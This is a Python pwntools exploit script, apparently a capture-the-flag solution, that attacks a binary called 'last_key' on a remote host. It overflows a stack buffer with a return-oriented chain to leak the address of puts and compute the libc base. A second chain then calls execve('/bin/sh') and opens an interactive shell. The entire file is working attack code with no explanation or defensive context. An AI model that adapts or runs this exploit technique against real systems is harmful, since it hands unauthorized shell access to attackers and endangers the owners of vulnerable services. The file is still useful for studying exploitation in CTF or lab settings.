from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'], aslr=True)

elf = ELF('./last_key')
libc = elf.libc

gdbscript = '''b *set_score+181
b *0x4017b5
c
c
c
c
'''

#p = process("./last_key")
#p = gdb.debug("./last_key", gdbscript=gdbscript)
p = remote('94.237.57.237', 51278)

map = p.recvuntil(b'*').decode().split('@')[1]
count = map.count(' ') + 1

for i in range(count):
	sleep(0.25)

	if i == count-1:
		p.clean()

	p.sendline(b'R')

print(p.recvuntil(b'Enter your name in the Hall of Fame: ').decode())

pop_rax = p64(0x40178f)
pop_rdi = p64(0x40178d)
puts_plt = p64(0x401100)
puts_plt_got = p64(0x403f88)
call_set_score = p64(0x4017b5)
ret = p64(0x40101a)

payload  = b'A' * 16	# buf
payload += b'B' * 8	# rbp
payload += pop_rdi
payload += puts_plt_got
payload += puts_plt
payload += ret
payload += call_set_score

p.sendline(payload)

p.recvuntil(b'prize..\n\n')

puts_addr = int.from_bytes(p.recv(6), 'little')
libc.address = puts_addr - libc.sym['puts']

print("[+] libc base @	", hex(libc.address))

binsh = next(libc.search(b'/bin/sh\x00'))
pop_rsi = p64(libc.address + 0x2be51)
pop_rdx_rbx = p64(libc.address + 0x90529)
syscall = p64(libc.address + 0x29db4)

payload2 = b''
payload2 += b'C' * 25
payload2 += pop_rax
payload2 += p64(0x3b)
payload2 += pop_rdi
payload2 += p64(binsh)
payload2 += pop_rdx_rbx
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += pop_rsi
payload2 += p64(0x0)
payload2 += syscall

p.sendline(payload2)

p.interactive()
